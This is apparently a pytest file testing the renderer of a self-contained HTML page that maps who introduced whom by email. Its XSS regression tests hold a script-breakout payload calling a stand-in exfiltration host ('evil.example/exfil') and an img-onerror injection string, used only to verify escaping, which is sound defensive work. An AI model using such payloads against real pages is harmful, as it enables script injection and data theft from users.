"""The rendered page must be genuinely self-contained (spec §9.6)."""

from __future__ import annotations

import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from graph_model import Edge, GraphData, Node, Stats  # noqa: E402
from intro_store import IntroRow  # noqa: E402
from render import render  # noqa: E402

# people_given (5th positional arg) is the ring's field: distinct people
# introduced, inbound only (see graph_model.Node). Dana introduced two
# distinct people here -- Alice and Ben -- so she is the one connector on
# the ring; Alice and Ben introduced nobody and never appear on it.
G = GraphData(
    nodes=[Node("dana@example.com", "Dana", 2, 0, 2),
           Node("alice@examplecorp.com", "Alice", 0, 1, 0),
           Node("ben@otherco.io", "Ben", 0, 1, 0)],
    edges=[Edge("dana@example.com", "alice@examplecorp.com"),
           Edge("dana@example.com", "ben@otherco.io")],
    stats=Stats(2, 3, 1, 2, 0, "2019-03-14", "2026-01-02", 1),
    super_connectors=[("dana@example.com", 2)],
)

# The same two introductions as rows, for tests that need a name to reach the
# page through the Introductions table rather than through the ring (the
# ring only draws and labels CONNECTORS -- people with people_given >= 1 --
# never the people they introduced, who show up as unlabelled dots there).
INTROS_G = [
    IntroRow("t1", "2020-01-01", "inbound", "dana@example.com",
             ("alice@examplecorp.com",), "intro one", "", 1.0),
    IntroRow("t2", "2020-01-02", "inbound", "dana@example.com",
             ("ben@otherco.io",), "intro two", "", 1.0),
]


def _render(tmp_path):
    out = tmp_path / "network.html"
    render(G, out)
    return out.read_text()


def test_page_makes_no_external_requests(tmp_path):
    html = _render(tmp_path)
    assert "unpkg.com" not in html
    assert not re.search(r'(src|href)\s*=\s*["\']https?://', html), \
        "the page must not reference any remote resource"


def test_vis_network_is_not_instantiated(tmp_path):
    """Supersedes the original `test_vis_network_is_no_longer_embedded`.

    That version fed render() a stub vendor_js file and asserted the stub's
    "/* stub */" marker did not reach the output. Once render() stopped
    taking a vendor_js argument at all (Task 9), there was no longer any way
    to hand it content that could reach the page, so the assertion became
    true by construction for every possible implementation -- it could not
    fail, and it was removed on that basis.

    That removal was too broad: it left the actual regression this guarded
    against -- someone pasting the vendored library back into one of the
    page's two <script> blocks by hand, source rather than via the retired
    parameter -- with no test in the suite watching for it. This is the
    assertion that survives instead: the literal `vis.Network(` constructor
    call the old force-directed graph used to make (see e13ed31/f55fc07 in
    git history) must never appear in rendered output. Do not delete this a
    second time for the same "can't fail" reasoning -- it is falsifiable by
    construction: pasting that call into the template makes it fail.
    """
    assert "vis.Network(" not in _render(tmp_path)


def test_every_node_and_edge_reaches_the_page(tmp_path):
    out = tmp_path / "network.html"
    render(G, out, intros=INTROS_G)
    html = out.read_text()
    for label in ("Dana", "Alice", "Ben"):
        assert label in html
    assert html.count('"from"') >= 2


def test_a_super_connector_reaches_the_page(tmp_path):
    """Supersedes `test_super_connectors_are_marked`.

    That test asserted on the brand coral hex code, which used to be applied
    specifically to super-connector nodes in the force graph's dataset. The
    ring does not distinguish super-connectors by colour at all -- every real
    connector is terracotta, and coral also appears in the page's always-on
    legend CSS regardless of the data, which made the old assertion true even
    for an empty graph (checked against `GraphData(nodes=[], ...)`). The ring
    marked weight instead by radius and closeness to centre.

    The ring itself was parked 2026-08-27, so weight is no longer drawn at
    all; what is still worth guarding is that a super-connector reaches the
    page as something the reader can open.
    """
    html = _render(tmp_path)
    assert '"dana@example.com"' in html


def test_empty_graph_renders_a_page_rather_than_crashing(tmp_path):
    out = tmp_path / "empty.html"
    render(GraphData(nodes=[], edges=[], stats=Stats(0, 0, 0, 0, 0, "", "", 0),
                     super_connectors=[]), out)
    assert "<html" in out.read_text()


def test_the_principal_is_absent_from_the_picture_entirely(tmp_path):
    """Supersedes an earlier test that checked the principal's node was merely
    sized modestly and titled "You".

    That was the right fix for the wrong problem. Everyone in the dataset was
    introduced to the user, so the edge carries no information about anyone
    while a node joined to all others dominates the layout. It is not shrunk
    now; it is not drawn.
    """
    out = tmp_path / "n.html"
    render(G, out, principal="alice@examplecorp.com")
    assert "alice@examplecorp.com" not in out.read_text()


def test_the_principal_is_hidden_even_when_they_would_otherwise_be_drawn(tmp_path):
    """FIX 4 (mutation sweep): every principal-hiding test in this file gives
    the principal people_given=0, so they were never eligible to appear
    regardless of the `hidden` rule at render.py:373 -- mutating that line to
    `hidden = frozenset()` (deleting the rule outright) left all 251 tests
    green. This principal has people_given=2 and sits in top_connectors, so
    she WOULD reach the leaderboard blob were `hidden` not excluding her.
    """
    g = GraphData(
        nodes=[Node("alice@examplecorp.com", "Alice Tran", 2, 0, 2),
               Node("dana@example.com", "Dana Okafor", 3, 0, 3)],
        edges=[],
        stats=Stats(5, 2, 2, 2, 0, "2019-03-14", "2026-01-02", 2),
        super_connectors=[("dana@example.com", 3), ("alice@examplecorp.com", 2)],
        top_connectors=[("dana@example.com", 3), ("alice@examplecorp.com", 2)],
    )
    out = tmp_path / "n.html"
    render(g, out, principal="alice@examplecorp.com")
    html = out.read_text()
    assert "Alice Tran" not in html
    assert "alice@examplecorp.com" not in html


def test_malicious_node_data_cannot_break_out_of_the_script_block(tmp_path):
    """Email headers are attacker-controlled — this tool reads mail from
    strangers — and mail_source.normalize_addr deliberately passes an
    unparseable header straight through as a stable key rather than dropping
    it (see its docstring). So a malformed "From:" header containing
    "</script><script>...</script>" can survive into a Node's id and label.
    json.dumps does not escape "<", so without an explicit escape in
    render.py this payload would close the inline <script> block early and
    let arbitrary script run in the user's browser when they open their own
    network page — defeating the "nothing leaves this machine" promise. This
    test is the regression guard for that escape; do not remove it as noise.
    """
    # people_given=4 puts this node on the ring (>=1) and past LABEL_MIN
    # (ring_layout.LABEL_MIN=4), so the payload reaches the page through both
    # the ring's HTML label span and the bracket data's JSON blob -- the two
    # sinks that used to be the vis-network `nodes` array's job.
    payload = 'Evil</script><script>fetch("https://evil.example/exfil")</script>'
    g = GraphData(
        nodes=[Node("evil@example.com", payload, 4, 0, 4)],
        edges=[],
        stats=Stats(4, 1, 1, 0, 0, "2020-01-01", "2020-01-01", 0),
        super_connectors=[("evil@example.com", 4)],
    )
    out = tmp_path / "network.html"
    render(g, out)
    html = out.read_text()

    # The payload must not have terminated the data <script> block early.
    assert "</script><script>" not in html
    # Exactly the two legitimate script elements the template emits now — the
    # page's own tabs/chart/table script, and the ring's.
    assert html.count("<script>") == 2
    assert html.count("</script>") == 2
    # The value still reaches the page, just defanged: "<" survives as its
    # JSON/JS-legal escape (only "<" needs escaping to break the parse of
    # "</script>" as a closing tag; ">" is not special here), decoding back
    # to the identical string at runtime.
    assert "\\u003c/script>\\u003cscript>" in html


# --------------------------------------------------------------------------
# The click panel this section used to cover -- `#panel`, `panelData`,
# `function openPanel`, bound both to a clicked graph node and to a clicked
# leaderboard row -- was retired in Task 8 along with the force-directed
# graph it was built for (see render.py's module docstring: `<div id="panel"
# class="card"></div>` is one of the two elements the ring's markup
# replaces). Its job -- "who did this person introduce you to" -- is now the
# ring's chain bracket, which does strictly more (it also shows the onward,
# second-degree step) and draws graph Node labels, not a Person's `.name`.
# `Person.name` and `Person.introduced_you_to` are consequently no longer
# read anywhere in render.py; the tests that exercised them
# (test_panel_data_carries_who_each_person_introduced_you_to,
# test_panel_data_is_escaped_like_every_other_injected_blob,
# test_panel_names_never_reach_an_html_sink) are removed rather than kept
# passing on a dead code path. Their escaping coverage is not lost: the
# ring's own sinks are covered directly above
# (test_malicious_node_data_cannot_break_out_of_the_script_block, routed
# through the ring) and in tests/test_render_ring.py
# (test_a_name_cannot_close_the_script_element,
# test_a_name_cannot_inject_markup).
# --------------------------------------------------------------------------

import sys as _sys  # noqa: E402
from pathlib import Path as _Path  # noqa: E402
_sys.path.insert(0, str(_Path(__file__).resolve().parents[1] / "src"))
from people_store import Person  # noqa: E402

PEOPLE = [
    Person("dana@example.com", "Dana Okafor", 2, 0,
           ("alice@examplecorp.com", "ben@otherco.io")),
    Person("alice@examplecorp.com", "Alice Tran", 0, 0, ()),
]


def test_rendering_without_people_still_works(tmp_path):
    """people is optional — a graph rendered before any roster exists must not
    crash."""
    out = tmp_path / "nopeople.html"
    render(G, out)
    assert "<html" in out.read_text()


def test_the_roster_still_marks_which_connectors_are_services(tmp_path):
    """What survives of `people` in render() past the click-panel retirement:
    `is_service`, which is still read (via `ring_pane` -> `ring_entries`) and
    still reaches the page: with the ring parked it colours the connector node
    inside the chain bracket sage rather than terracotta. Person
    names are attacker-controlled and unread now, so this is the field worth
    a regression guard.
    """
    out = tmp_path / "service.html"
    render(G, out, people=[
        Person("dana@example.com", "Dana", 2, 0, (), is_service=True)])
    html = out.read_text()
    assert '"is_service": true' in html.lower()


# --------------------------------------------------------------------------
# The principal is in the DATA but not in the PICTURE.
# --------------------------------------------------------------------------

G2 = GraphData(
    nodes=[Node("dana@example.com", "Dana Okafor", 2, 0),
           Node("alice@examplecorp.com", "Alice Tran", 0, 2),
           Node("ben@otherco.io", "Ben Mercer", 0, 1)],
    edges=[Edge("dana@example.com", "alice@examplecorp.com"),
           Edge("dana@example.com", "ben@otherco.io")],
    stats=Stats(2, 3, 1, 2, 0, "2019-03-14", "2026-01-02", 1),
    super_connectors=[("dana@example.com", 2)],
    top_connectors=[("dana@example.com", 2)],
)

INTROS_G2 = [
    IntroRow("t1", "2020-01-01", "inbound", "dana@example.com",
             ("alice@examplecorp.com",), "intro one", "", 1.0),
    IntroRow("t2", "2020-01-02", "inbound", "dana@example.com",
             ("ben@otherco.io",), "intro two", "", 1.0),
]


def _html2(tmp_path, **kw):
    out = tmp_path / "n.html"
    render(G2, out, **kw)
    return out.read_text()


def test_the_principal_is_not_drawn_as_a_node(tmp_path):
    """Every person in the dataset was introduced to the user — that edge is
    true of everyone and so carries no information, while a node joined to all
    others dominates the layout and hides the structure worth seeing."""
    html = _html2(tmp_path, principal="alice@examplecorp.com")
    assert "Alice Tran" not in html


def test_edges_into_the_principal_are_not_drawn(tmp_path):
    html = _html2(tmp_path, principal="alice@examplecorp.com")
    assert "alice@examplecorp.com" not in html


def test_edges_between_other_people_survive(tmp_path):
    """Dana -> Ben is the informative edge: who introduced you to whom.

    Ben never introduced anyone, so the ring alone would not label him (only
    connectors get a label there) — this needs the Introductions table too,
    same as `test_every_node_and_edge_reaches_the_page` above.
    """
    html = _html2(tmp_path, principal="alice@examplecorp.com",
                  intros=INTROS_G2)
    assert "Dana Okafor" in html and "Ben Mercer" in html


def test_without_a_principal_everyone_is_drawn(tmp_path):
    html = _html2(tmp_path, intros=INTROS_G2)
    assert "Alice Tran" in html


def test_the_leaderboard_is_rendered_on_the_page(tmp_path):
    html = _html2(tmp_path, principal="alice@examplecorp.com")
    assert "Dana Okafor" in html
    assert "leaderboard" in html.lower()


# --------------------------------------------------------------------------
# Clicking a leaderboard name used to open the same `#panel` the graph's own
# click handler opened (`function openPanel`, bound from both a vis-network
# node click and a leaderboard row click). That panel is retired along with
# the force graph -- see the retirement note above the (former) "click
# panel" section. `test_the_page_binds_a_click_handler_to_leaderboard_rows`
# and `test_one_panel_routine_serves_both_entry_points` tested exactly that
# binding and are removed with it.
#
# A leaderboard row is clickable again, though: a fix round on this task
# ruled that leaving the rows inert -- looking clickable, doing nothing --
# was a visible regression, since a chain-starter row right next to it on
# the same pane already gets this behaviour. A row click now drives the
# ring's own selectOrToggle() (render_ring.py's _RING_PANE_SCRIPT), the same
# routine a ring node click and a starter row click use. What is still true,
# and still worth guarding, is that the leaderboard's underlying data still
# carries each row's address -- the one assertion below that was not
# specifically about the click -- plus (below it) that this address is the
# same one a ring node answers to, which is the one fact the wiring depends
# on and a static-HTML test can actually observe.
# --------------------------------------------------------------------------


def test_leaderboard_rows_carry_the_address(tmp_path):
    html = _html2(tmp_path, principal="alice@examplecorp.com",
                  people=[Person("dana@example.com", "Dana Okafor", 2, 0,
                                 ("ben@otherco.io",))])
    assert '"id": "dana@example.com"' in html or '"id":"dana@example.com"' in html


def test_a_leaderboard_row_carries_the_same_id_as_its_ring_node(tmp_path):
    """The leaderboard is built client-side (render.py's inline script turns
    the `$board` blob into `<li>` rows at runtime), so there is no static
    `<li data-id=...>` for a pytest string check to find directly -- the
    script that builds each row has to be the thing that carries the id
    across. This checks both halves of that: the row-building script stamps
    `li.dataset.id` from the same `r.id` the `$board` blob carries, and that
    id (Dana's address) is a key in BRACKETS -- the one fact render_ring.py's
    leaderboard-click wiring depends on.
    """
    out = tmp_path / "n.html"
    render(G, out, principal=PRINCIPAL, people=PEOPLE, intros=INTROS)
    page = out.read_text()
    assert "li.dataset.id = r.id" in page
    assert '"id": "dana@example.com"' in page or '"id":"dana@example.com"' in page
    # ...and that same id is a key in BRACKETS, which is what the row's click
    # handler looks the bracket up by. With the ring parked this is the only
    # surviving join between the two halves.
    assert '"dana@example.com": {' in page or '"dana@example.com":{' in page


def test_the_table_still_carries_direction_per_row(tmp_path):
    """Supersedes `test_edges_are_coloured_by_direction`.

    That test asserted on the inbound-red hex code, which used to colour
    the force graph's edges by direction. The ring does not draw edges at
    all, and that hex code is also the legend's always-on `key` colour --
    present even for an empty graph -- so the old assertion no longer tested
    what its docstring claimed. The Introductions table is the surviving
    place `direction` reaches the page; the data is still there even though
    nothing currently colours the table by it.
    """
    g = GraphData(
        nodes=[Node("dana@example.com", "Dana", 1, 0, 1),
               Node("ben@otherco.io", "Ben", 0, 1)],
        edges=[Edge("dana@example.com", "ben@otherco.io", "inbound")],
        stats=Stats(1, 2, 1, 1, 0, "2020-01-01", "2020-01-01", 0),
        super_connectors=[], top_connectors=[],
    )
    rows = [IntroRow("t1", "2020-01-01", "inbound", "dana@example.com",
                     ("ben@otherco.io",), "intro", "", 1.0)]
    out = tmp_path / "e.html"
    render(g, out, intros=rows)
    assert '"dir": "inbound"' in out.read_text()


# --------------------------------------------------------------------------
# Task 8: the ring replaces the force-directed graph inside the Network
# pane, not the page. Everything else -- header, legend, the four tabs, the
# leaderboard -- must survive intact.
# --------------------------------------------------------------------------

PRINCIPAL = "alice@examplecorp.com"
INTROS = INTROS_G


def test_the_four_tabs_survive_the_ring(tmp_path):
    """The ring replaces the graph inside the Network pane, not the page."""
    out = tmp_path / "n.html"
    render(G, out, principal=PRINCIPAL, people=PEOPLE, intros=INTROS)
    page = out.read_text()
    for pane in ("pane-net", "pane-vol", "pane-time", "pane-table"):
        assert 'data-pane="%s"' % pane in page
        assert 'id="%s"' % pane in page


def test_the_leaderboard_survives_the_ring(tmp_path):
    out = tmp_path / "n.html"
    render(G, out, principal=PRINCIPAL, people=PEOPLE, intros=INTROS)
    assert 'id="board"' in out.read_text()


def test_the_network_pane_holds_the_chain_panel_not_a_physics_canvas(tmp_path):
    out = tmp_path / "n.html"
    render(G, out, principal=PRINCIPAL, people=PEOPLE, intros=INTROS)
    page = out.read_text()
    assert 'id="ring-panel"' in page       # the chain panel is present
    assert '<div id="net"></div>' not in page


def test_the_ring_css_does_not_leak_out_of_its_pane(tmp_path):
    """The ring is injected into a page that already styles body and html."""
    out = tmp_path / "n.html"
    render(G, out, principal=PRINCIPAL, people=PEOPLE, intros=INTROS)
    page = out.read_text()
    ring_css_start = page.index("/* ring */")
    ring_css_end = page.index("/* end ring */")
    ring_css = page[ring_css_start:ring_css_end]
    for selector in ("body{", "body {", "html{", "html {"):
        assert selector not in ring_css


def test_the_page_still_fetches_nothing(tmp_path):
    out = tmp_path / "n.html"
    render(G, out, principal=PRINCIPAL, people=PEOPLE, intros=INTROS)
    page = out.read_text()
    assert "http://" not in page and "https://" not in page


# --------------------------------------------------------------------------
# The roster (Plugin MVP §4.4) — who these people are, and when you last
# emailed each of them.
# --------------------------------------------------------------------------

ROSTER_PEOPLE = [
    Person("dana@example.com", "Dana Okafor", 2, 0,
           ("alice@examplecorp.com", "ben@otherco.io"),
           last_contact="2026-01-20"),
    Person("ben@otherco.io", "Ben Mercer", 0, 0, ()),
    Person("kai@gmail.com", "Kai Rivera", 0, 0, (), last_contact="2024-02-02"),
]


def _roster_page(tmp_path, people=None):
    out = tmp_path / "n.html"
    render(G, out, principal=PRINCIPAL,
           people=ROSTER_PEOPLE if people is None else people, intros=INTROS)
    return out.read_text()


def test_the_roster_lists_every_person_it_has(tmp_path):
    page = _roster_page(tmp_path)
    for name in ("Dana Okafor", "Ben Mercer", "Kai Rivera"):
        assert name in page


def test_the_roster_has_its_own_pane(tmp_path):
    assert 'id="pane-roster"' in _roster_page(tmp_path)


def test_the_roster_does_not_claim_to_know_where_anyone_works(tmp_path):
    """The 'Where' column was removed after the first real user asked what it
    was for. It only ever held the email domain, and the page had to apologise
    for it on every render -- "a domain is where someone emailed from, not
    where they work now." A column needing a disclaimer under it is not
    carrying its width. Nothing may reintroduce the claim."""
    page = _roster_page(tmp_path)
    assert "<th>Where</th>" not in page
    assert '"where"' not in page
    assert "personal address" not in page


def test_an_unknown_last_contact_is_not_reported_as_never(tmp_path):
    """Bob sees one channel. Silence is not absence (§4.6), and the roster is
    the surface most likely to turn it into a false claim."""
    page = _roster_page(tmp_path)
    assert "never" not in page.lower().split("pane-roster")[1][:4000]


def test_the_roster_carries_how_you_know_them(tmp_path):
    page = _roster_page(tmp_path)
    assert "introduced you to 2 people" in page


def test_a_roster_name_cannot_inject_markup(tmp_path):
    """Two separate defences, because the first one alone is not enough.

    `_json` escaping keeps a name from closing the <script> element, so the raw
    markup never appears in the page source. That protects the TRANSPORT and
    says nothing about the SINK: the decoded string still reaches the DOM, and
    an innerHTML there would run it. Swapping textContent for innerHTML in the
    row builder passed this test when it checked the source text alone.
    """
    page = _roster_page(tmp_path, people=[
        Person("x@example.com", "<img src=x onerror=alert(1)>", 0, 0, ())])
    assert "<img src=x" not in page                       # transport
    builder = page[page.index("const roster ="):page.index("const board =")]
    assert "innerHTML" not in builder, "a mail-derived name reaches innerHTML"
    assert builder.count("textContent") >= 4              # sink, one per column


def test_the_roster_is_sorted_by_staleness_with_unknowns_last(tmp_path):
    """§4.4: sorting is not ranking. Order by last contact -- oldest first,
    because 'who have I lost touch with' is the question -- and people with no
    known contact sort last rather than masquerading as the stalest."""
    page = _roster_page(tmp_path)
    blob = re.search(r'const roster = (\[.*?\]);', page, re.S).group(1)
    order = re.findall(r'"name": "([^"]+)"', blob)
    assert order == ["Kai Rivera", "Dana Okafor", "Ben Mercer"]


# --------------------------------------------------------------------------
# "How you know them" must name who introduced you FIRST, not whoever sorts
# first alphabetically. The alphabetical rule credited a booking tool
# (invite@vimcal.com) over the person who actually made the introduction.
# --------------------------------------------------------------------------

def test_the_roster_names_the_earliest_introducer_not_the_alphabetical_one(tmp_path):
    """Cy was introduced twice. Aaron sorts first; Zoe came first. Zoe is how
    Alice came to know Cy — a later re-introduction is not an origin."""
    from graph_model import build_graph
    from intro_store import IntroRow
    from datetime import date

    me = "alice@examplecorp.com"
    early, late, cy = "zoe@example.com", "aaron@example.com", "cy@thirdco.dev"

    def r(tid, who, d):
        return IntroRow(thread_id=tid, date=d, direction="inbound",
                        introducer=who, introduced=(me, cy), subject="Intro",
                        thread_link="", confidence=0.9)

    g = build_graph([r("1", early, "2019-03-01"), r("2", late, "2025-06-01")],
                    me, today=date(2026, 8, 20),
                    names={early: "Zoe Marsh", late: "Aaron Webb"})

    out = tmp_path / "n.html"
    render(g, out, principal=me,
           people=[Person(cy, "Cy Nakamura", 0, 0, (), last_contact="2026-02-02")],
           intros=[])
    page = out.read_text()

    assert "Zoe Marsh introduced you" in page
    assert "Aaron Webb introduced you" not in page


def _how(rows_in, names, person, principal="alice@examplecorp.com"):
    """The `how` cell for one person, straight from _roster_rows.

    Asserted on the data rather than the page: the roster travels to the
    browser inside a JSON blob, so "·" arrives as \\u00b7 in the raw HTML.
    That escaping is render plumbing and is tested elsewhere; this is about
    what the column says.
    """
    from graph_model import build_graph
    from render import _roster_rows
    from datetime import date
    g = build_graph(rows_in, principal, today=date(2026, 8, 20), names=names)
    label_of = {n.id: n.label for n in g.nodes}
    rows = _roster_rows(g, [Person(person, "Cy Nakamura", 0, 0, ())],
                           principal, label_of)
    return rows[0]["how"]


def _intro(who, when, principal="alice@examplecorp.com", person="cy@thirdco.dev"):
    from intro_store import IntroRow
    return IntroRow(thread_id="1", date=when, direction="inbound",
                    introducer=who, introduced=(principal, person),
                    subject="Intro", thread_link="", confidence=0.9)


def test_the_roster_dates_the_introduction_when_it_knows_it():
    dana = "dana@example.com"
    how = _how([_intro(dana, "2019-03-14")], {dana: "Dana Okafor"},
               "cy@thirdco.dev")
    assert how == "Dana Okafor introduced you \u00b7 Mar 2019"


def test_an_undated_introduction_gets_no_invented_date():
    dana = "dana@example.com"
    how = _how([_intro(dana, "")], {dana: "Dana Okafor"}, "cy@thirdco.dev")
    assert how == "Dana Okafor introduced you"


def test_a_malformed_date_is_dropped_rather_than_half_rendered():
    dana = "dana@example.com"
    how = _how([_intro(dana, "not-a-date")], {dana: "Dana Okafor"},
               "cy@thirdco.dev")
    assert how == "Dana Okafor introduced you"
